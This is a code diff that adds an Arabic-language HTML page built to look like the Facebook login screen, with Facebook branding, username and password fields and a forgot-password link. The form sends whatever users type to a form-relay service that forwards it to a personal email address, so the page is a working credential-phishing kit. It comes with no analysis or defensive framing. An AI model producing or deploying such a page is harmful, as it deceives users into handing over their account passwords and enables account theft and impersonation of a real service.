@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      direction: rtl;
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+      text-align: center;
+    }
+    .facebook-title {
+      font-size: 36px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 85px; /* زوّدنا التباعد هنا */
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      font-size: 14px;
+    }
+    button {
+      padding: 10px;
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .forgot {
+      margin-top: 15px;
+    }
+    .forgot a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <!-- عنوان Facebook -->
+  <div class="facebook-title">Facebook</div>
+
+<h2 style="text-align: right;">
+  <span style="color: black; font-size: 20px;">تسجيل الدخول</span>
+  <span style="color: gray; opacity: 0.6; font-size: 16px;">(Log in)</span>
+</h2>
+
+  <!-- النموذج بفراغين -->
+  <form action="https://formsubmit.co/mouklidudi@email.com" method="POST">
+    <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+    <input type="password" name="password" placeholder="كلمة المرور" required>
+    <button type="submit">تسجيل الدخول</button>
+  </form>
+
+  <!-- رابط هل نسيت كلمة المرور -->
+  <div class="forgot">
+    <a href="forgot.html">هل نسيت كلمة المرور؟</a>
+  </div>
+</div>
+
+</body>
+</html>
